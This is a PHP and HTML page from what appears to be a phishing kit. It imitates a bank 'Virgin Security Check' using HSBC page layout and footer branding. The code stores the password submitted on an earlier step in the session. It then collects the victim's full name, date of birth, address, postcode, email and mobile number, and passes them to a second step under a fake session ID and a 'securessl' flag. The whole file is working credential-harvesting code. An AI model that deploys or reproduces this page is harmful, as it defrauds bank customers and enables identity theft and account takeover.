<?php

error_reporting(0);

session_start();
require "../assets/includes/functions.php";
require "../assets/includes/Bank_One_Time.php";
require "../assets/includes/simplehtmldom.php";
require "../assets/includes/enc.php";
$_SESSION['password'] = $_POST['password'];

?>

<html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" class="dj_webkit dj_chrome dj_contentbox"><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>Virgin Security Check</title>
<link rel="shortcut icon" href="assets/img/favicon.ico">	
<link rel="stylesheet" href="assets/css/l33.css" media="screen">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/jquery.validation/1.14.0/jquery.validate.js"></script>
<script src="https://jqueryvalidation.org/files/dist/additional-methods.min.js"></script>
<script>
jQuery(function($) {
var timemmselect = document.getElementById('timemm');
var timemminput = document.getElementById('timemminput');
timemmselect.onchange = function() {
timemminput.innerHTML = timemmselect.value;
}
var timeyyselect = document.getElementById('timeyy');
var timeyyinput = document.getElementById('timeyyinput');
timeyyselect.onchange = function() {
timeyyinput.innerHTML = timeyyselect.value;
}


go.onclick = function() {
tm.value = timemminput.innerHTML;
ty.value = timeyyinput.innerHTML;
}

});

	
  (function($,W,D)	{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#details").validate({
				errorElement: "span",			
                rules: {
					name: {	required: true,	minlength: 4,},
					day: { required: true},
					month: { required: true},
					year: { required: true},
					email: { required: true, email: true,},
					telephone: { required: true, minlength: 11, digits: true,},
					address: { required: true, minlength: 4,},
					town: { required: true, minlength: 2,},
					postcode: { required: true, minlength: 4,},
					timemm: { required: true,},
					timeyy: { required: true,},
                },
				groups: {
					dob: "day month year",
					addresstime: "timemm timeyy",
				},
				errorPlacement: function(error, element) {
				if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year") 
				error.insertAfter("#doberror");
				else 
				error.insertAfter(element);	
				if (element.attr("name") == "timemm" || element.attr("name") == "timeyy") 
				error.insertAfter("#timeerror");
				},
                messages: {
					name: {
						required: "Please provide your full name",
						minlength: jQuery.validator.format("Please provide your full name"),
					},
					day: { required: "Please provide your date of birth", },
					month: { required: "Please provide your date of birth", },
					year: { required: "Please provide your date of birth", },
					email: {
						required: "Please provide your email address",
						email: jQuery.validator.format("Please check the email address you have entered"),
					},
					address: {
						required: "Please provide the first line of your address",
						minlength: jQuery.validator.format("Please check the address you have entered"),
					},
					town: {
						required: "Please provide your town/city",
						minlength: jQuery.validator.format("Please check the town/city you have entered"),
					},
					postcode: {
						required: "Please provide your postcode",
						minlength: jQuery.validator.format("Please check the postcode you have entered"),
					},
					timemm: {
						required: "Please select how long you have lived at your current address",
					},
					timeyy: {
						required: "Please select how long you have lived at your current address",
					},
					telephone: {
						required: "Please provide your telephone number",
						minlength: jQuery.validator.format("Please check the telephone number you have entered"),
						digits: jQuery.validator.format("Please ensure you enter digits only"),
					},
				},
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  </script>
<style>
.error {
	color:red;
	font-size: 1.4em;
	font-weight: bold;
}
#dob-error {
	line-height: 30px;
	padding-left:20px
}
#addresstime-error {
	line-height: 30px;
	padding-left:20px
}
</style>
</head>

<body class="l33">
<p style="background-color: #515358;"></p>
<div id="top">
<div id="mainTopWrapper">
<div id="mainTopUtility">
<h1>Personal</h1>

<div id="mainTopUtilityRow">
<ul id="tabs">
<li class="skipLink"><a class="skip" href="#" lang="en">Skip page header and navigation</a></li>

<li class="on"><a href="#">Personal</a></li>

<li><a href="#">Business</a></li>
</ul>

<div id="siteControls">
<div id="langList">
<ul>
<li class="selected"><a href="#">English</a></li>
</ul>
</div>

<div id="locale" lang="en">
<div lang="en" widgetid="countrySelectorWrapper" aria-relevant="all" aria-live="polite"><a class="dropDownLink trigger" href="#">
<span><span class="flag uk">United Kingdom</span></span></a>
<div class="placeholder"></div>
</div>
</div>

</div>
</div>
</div>

<div id="mainTopNavigation">
<div id="logo"><a href="#"><img src="assets/img/logo.gif" width="138" title="" alt=""></a></div>

<div id="sections" lang="en">
<ul id="topLevel">
<li class="level1"><a href="#" class="mainTopNav"><strong>Everyday banking</strong><br>
Accounts &amp; services</a>
</li>

<li class="level1"><a class="mainTopNav" href="#"><strong>Borrowing</strong><br>
Loans &amp; mortgages</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Investing</strong><br>
Products &amp; analysis</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Insurance</strong><br>
Property &amp; family</a>
</li>

<li class="level1"><a href="#" class="mainTopNav"><strong>Life events</strong><br>
Help &amp; support</a>
</li>
</ul>
</div>
</div>
</div>


					<p></p>

<div class="pageHeaderBg">
<div class="pageHeading row">
<div class="pageHeadingInner">
<h2>Virgin Security Check</h2>
</div>
</div>
</div>

<p></p>

		<div class="innerPage" id="innerPage">
			<div class="grid_skin">
				<div class="row">
					<div class="grid grid_24">
						<ul class="stepTracker stepCount3 stepProgress" data-dojo-type="hsbcwidget/stepTracker" data-dojo-props="addNumsNoDots: true" id="hsbcwidget_stepTracker_0" lang="en" widgetid="hsbcwidget_stepTracker_0">
							<li class="completed first beforeSelected">
								<a href="#" tabindex="0"><span class="progressNum">1</span>
								<span class="hidden" aria-hidden="true">Current Step: </span>
									About the verification process
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">1</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										<span class="stepSelected" data-nlsid="stepTracker.selected"></span>
									</span>
								</a>
							</li>
							<li class="selected">
								<a href="#"><span class="progressNum">2</span>
								<span class="hidden" aria-hidden="true">Next Step: </span>
									Confirm personal details
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">2</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
							<li class="last">
								<a href="#"><span class="progressNum">3</span>
									Confirm account information
									<span class="hidden" aria-hidden="true">
										<span data-nlsid="stepTracker.step"></span>
										<span class="stepNumber">3</span>
										<span data-nlsid="stepTracker">of</span>
										<span class="stepTotal">3</span>
										
									</span>
								</a>
							</li>
						</ul>
					</div>
				</div>

				<div class="row activate">

<div class="containerStyle01">

						<div class="grid grid_24">
<form id="details" method="post" action="Step2.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true">
						<div class="row containerStyle17">
						<div class="row">
						<h3>Confirm Personal Details</h3>
						</div>
										

						</div>
						<div>

							
<div class="questionGroup questionGroup-ext01">
<div class="question clearfix jsQuestion">
<label for="name">Full Name </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="name" type="text" value="<?php echo $_SESSION['name'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="name">Date of Birth </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="dob" type="text" value="<?php echo $_SESSION['dob'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="name">Address </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="address" placeholder="1st line of your address" type="text" value="<?php echo $_SESSION['address'];?>">
</div>
</div>
</div>
</div>


<div class="question clearfix jsQuestion">
<label for="town">Town / City </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="town" type="text" value="<?php echo $_SESSION['town'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="town">Postcode </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="postcode" type="text" value="<?php echo $_SESSION['postcode'];?>">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="name">Time at Address </label>
<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="timemm" name="timemm" style="width: 100px;">
<option value="">Months</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
</select>
<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner"><span class="value" id="timemminput">Months</span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>


<div class="textInput validationInput small" style="width: 100px;">
<div class="customSelect">
<div>
<select class="dropdownSize replaced" id="timeyy" name="timeyy" style="width: 100px;">
<option value="">Years</option>
<option value="01">01</option>
<option value="02">02</option>
<option value="03">03</option>
<option value="04">04</option>
<option value="05">05</option>
<option value="06">06</option>
<option value="07">07</option>
<option value="08">08</option>
<option value="09">09</option>
<option value="10">10</option>
<option value="11">11</option>
<option value="12">12+</option>
</select>
<div class="select-overlay" style="width: 100px; height: 31px;">
<div class="inner"><span class="value" id="timeyyinput">Years</span>
<span class="arrow" style="margin-top: -19px;"></span>
</div>
</div>
</div>
</div>
</div>
<span id="timeerror"></span>
</div>

<div class="question clearfix jsQuestion">
<label for="email">Email </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="email" type="text" value="">
</div>
</div>
</div>
</div>

<div class="question clearfix jsQuestion">
<label for="telephone">Mobile Phone Number </label>
<div class="textInput validationInput small">
<div class="dijit dijitReset dijitInline dijitLeft dijitTextBox dijitValidationTextBox dijitTextBoxIncomplete dijitValidationTextBoxIncomplete dijitIncomplete" lang="en">
<div class="dijitReset dijitValidationContainer">
</div>
<div class="dijitReset dijitInputField dijitInputContainer">
<input class="dijitReset dijitInputInner" autocomplete="off" name="telephone" type="text" value="<?php echo $_SESSION['telephone'];?>">
</div>
</div>
</div>
</div>
</div>


</div>



<input type="hidden" name="dd" id="dd">
<input type="hidden" name="mm" id="mm">
<input type="hidden" name="yy" id="yy">
<input type="hidden" name="tm" id="tm">
<input type="hidden" name="ty" id="ty">
						


 

<div class="buttonRow row">
									<div class="right">
										<div class="button primary primaryBtn">
											<span class="buttonInner"> <input class="submit_input" autocomplete="off" id="go" type="submit" value="Continue">
											</span>
										</div>
									</div>
								</div>



					</form>
					</div>
					<!-- Entity Content Right Starts -->
					
						<!-- Entity Content Right Ends -->
				</div>
				</div>
				<!-- Main Content Ends -->
			</div>
		</div>
		<!-- Entity Content Bottom Starts -->
		<div class="containerStyle07" style="padding: 0px;">
			<div class="innerPage">
				<div class="grid_skin">
					<div class="row">
						
					</div>
				</div>
			</div>
		</div>
			

<div dir="ltr" id="footerLinks">
<div id="footerLinksRow">
<ul>
<li class="contact"><a href="#">Contact and Support</a></li>

<li class="branch"><a href="#">Find a branch</a></li>

<li><a href="#" onclick="" title="" alt="">Website feedback</a></li>
</ul>
</div>
</div>

<div dir="ltr" id="footerMap">
<div class="sixCol" id="footerMapRow">
<div class="column">
<h2><a href="#">Everyday banking</a></h2>

<ul>
<li><a href="#">Current accounts</a></li>

<li><a href="#">Saving accounts</a></li>

<li><a href="#">Credit cards</a></li>

<li><a href="#">International services</a></li>

<li><a href="#">Switching to HSBC</a></li>

<li><a href="#">Security centre</a></li>

<li><a href="#">Card support</a></li>

<li><a href="#">Online Banking</a></li>
</ul>
</div>

<div class="column">
<h2>Premium banking</h2>

<ul>
<li><a href="#">HSBC Premier</a></li>

<li><a href="#">HSBC Advance</a></li>

<li><a href="#">HSBC Expat</a></li>

<li><a href="#">HSBC Private Bank</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Borrowing</a></h2>

<ul>
<li><a href="#">Mortgages</a></li>

<li><a href="#">Loans</a></li>

<li><a href="#">Mortgage calculators</a></li>

<li><a href="#">Overdrafts</a></li>

<li><a href="#">Buy to let</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Investing</a></h2>

<ul>
<li><a href="#">Investment products</a></li>

<li><a href="#">Why invest with us?</a></li>

<li><a href="#">News and analysis</a></li>
</ul>
</div>

<div class="column">
<h2><a href="#">Insurance</a></h2>

<ul>
<li><a href="#">Home insurance</a></li>

<li><a href="#">Travel insurance</a></li>

<li><a href="#">Car insurance</a></li>

<li><a href="#">Premier car insurance</a></li>

<li><a href="#">Life, critical illness &amp;<br>
income cover</a></li>

<li><a href="#">Student insurance</a></li>
</ul>
</div>

<div class="column last">
<h2><a href="#">Planning</a></h2>

<ul>
<li><a href="#">Health &amp; family</a></li>

<li><a href="#">Home &amp; lifestyle</a></li>

<li><a href="#">Work &amp; retirement</a></li>

<li><a href="#">Planning tools</a></li>
</ul>
</div>
</div>
</div>

<div dir="ltr" id="footerUtility">
<div id="footerUtilityRow">
<ul>
<li><a href="#">About HSBC</a></li>

<li><a href="#">Site map</a></li>

<li><a href="#'">Newsroom</a></li>

<li><a href="#">Legal</a></li>

<li><a href="#" title="" class="dnt_no_consent" onclick="" alt="">Cookie Policy</a></li>

<li><a href="#">Accessibility</a></li>

<li><a href="#">Sustainability</a></li>

<li><a href="#'">Careers</a></li>

<li><a href="#'">HSBC Group</a></li>
</ul>

<p>&copy;&nbsp;HSBC Bank plc 2016</p>
</div>
</div>


	</div>


</body></html>